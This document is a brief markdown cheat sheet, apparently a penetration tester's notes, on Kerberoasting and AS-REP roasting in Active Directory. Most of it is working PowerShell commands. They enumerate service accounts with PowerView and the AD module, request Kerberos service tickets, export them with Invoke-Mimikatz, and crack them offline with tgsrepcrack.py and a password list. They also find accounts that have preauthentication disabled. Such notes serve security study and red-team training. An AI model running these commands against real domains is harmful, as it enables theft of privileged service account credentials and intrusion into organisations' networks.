# Kerberoast

* offline cracking of service account passwords
* the kerberos session ticket (TSG) has a server portion which is encrypted with the password hash of service account. this makes it possible to request a ticket and do offline password attack
* service accounts are usually ignored (passwords rarely changed) and have privileged access.
* password hashes of service accounts could be used to create silver tickets.


<br>

## classic kerberoast attack

#### finding user accounts used as service accounts
```powershell
Get-NetUser -SPN   ## powerview

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   ## AD module
```

#### request a TGS
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/servername.sub.domain.local"
```

* Request-SPNTicket from powerview can be used for cracking with john or hashcat

#### check if TGS has been granted
```powershell
klist
```

#### export all tickets using mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### crack the service account password
```powershell
python.exe .\tgsrepcrack.py .\pass-list.txt .\user1@MSSQLSvc~servername.sub.domain.local-SUB.DOMAIN.LOCAL.kirbi
```

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py


<br>

## targeted kerberoasting - AS-REPs

* if a users UserAccountControl settings have "do not require kerberos preauthentication" enabled, example, kerberos preauth disabled, it is possible to grab users crackable AS-REP and bruteforce it offline
* with sufficient rights (genericwrite or genericall), kerberos preauth can be forced disabled.


### enumerating accounts with kerberos preauth disabled

```powershell
Get-DomainUser -PreauthNotRequired -Verbose   ## powerview

Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth   ## AD module
```













 














